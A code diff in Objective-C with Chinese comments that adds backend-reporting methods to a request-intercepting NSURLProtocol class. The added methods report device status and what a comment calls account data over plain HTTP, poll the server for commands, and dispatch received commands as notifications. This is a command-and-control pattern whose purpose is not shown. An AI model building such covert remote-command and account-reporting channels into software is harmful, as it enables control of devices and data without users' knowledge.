@@ -72,6 +72,89 @@ static volatile CFAbsoluteTime sLastPing = 0;
     }] resume];
 }
 
+/// 通用请求（纯完成回调，无 semaphore）
++ (void)_sendRequest:(NSString *)method path:(NSString *)path body:(NSData *)body
+          completion:(void (^)(NSData *data, NSError *error))completion {
+    NSString *urlStr = [NSString stringWithFormat:@"http://%@:%d%@",
+                         XN_BACKEND_HOST, XN_BACKEND_PORT, path];
+    NSURL *url = [NSURL URLWithString:urlStr];
+    if (!url) { if (completion) completion(nil, [NSError errorWithDomain:@"XN" code:9 userInfo:nil]); return; }
+
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+    req.HTTPMethod = method;
+    if (body) {
+        req.HTTPBody = body;
+        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    }
+    req.timeoutInterval = 10;
+
+    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
+    cfg.timeoutIntervalForRequest = 10;
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
+
+    [[session dataTaskWithRequest:req
+                completionHandler:^(NSData *data, NSURLResponse *resp, NSError *error) {
+        if (completion) completion(data, error);
+        [session finishTasksAndInvalidate];
+    }] resume];
+}
+
+/// 上报设备状态
++ (void)reportOnline:(NSString *)deviceId {
+    if (!deviceId) return;
+    NSDictionary *payload = @{
+        @"type": @"status",
+        @"data": @{@"device_id": deviceId, @"status": @"online"}
+    };
+    NSData *json = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+    if (!json) return;
+    NSString *path = [NSString stringWithFormat:@"/ws/%@", deviceId];
+    [self _sendRequest:@"POST" path:path body:json completion:^(NSData *data, NSError *error) {
+        if (error) {
+            NSLog(@"[XNURLProtocol] ⚠️ 上报失败: %@", error.localizedDescription);
+        } else {
+            NSLog(@"[XNURLProtocol] ✅ 已上报设备状态");
+            // 上报响应可能带回指令
+            [self _handleResponseData:data];
+        }
+    }];
+}
+
+/// 发送消息（上报账号/结果等），响应可能带回指令
++ (void)sendMessage:(NSDictionary *)msg deviceId:(NSString *)deviceId {
+    if (!msg || !deviceId) return;
+    NSData *json = [NSJSONSerialization dataWithJSONObject:msg options:0 error:nil];
+    if (!json) return;
+    NSString *path = [NSString stringWithFormat:@"/ws/%@", deviceId];
+    [self _sendRequest:@"POST" path:path body:json completion:^(NSData *data, NSError *error) {
+        if (!error && data) [self _handleResponseData:data];
+    }];
+}
+
+/// 轮询指令
++ (void)pollCommands:(NSString *)deviceId {
+    if (!deviceId) return;
+    NSString *path = [NSString stringWithFormat:@"/ws/%@/poll", deviceId];
+    [self _sendRequest:@"GET" path:path body:nil completion:^(NSData *data, NSError *error) {
+        if (!error && data) [self _handleResponseData:data];
+    }];
+}
+
+/// 解析响应中的指令并派发
++ (void)_handleResponseData:(NSData *)data {
+    if (!data) return;
+    NSDictionary *d = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+    if (![d isKindOfClass:[NSDictionary class]]) return;
+    if (d[@"command"]) {
+        NSDictionary *cmd = d[@"command"];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[NSNotificationCenter defaultCenter] postNotificationName:@"XNPiggybackCommand"
+                                                                object:nil
+                                                              userInfo:@{@"command": cmd}];
+        });
+    }
+}
+
 #pragma mark - NSURLProtocol 拦截判定
 
 + (BOOL)canInitWithRequest:(NSURLRequest *)request {
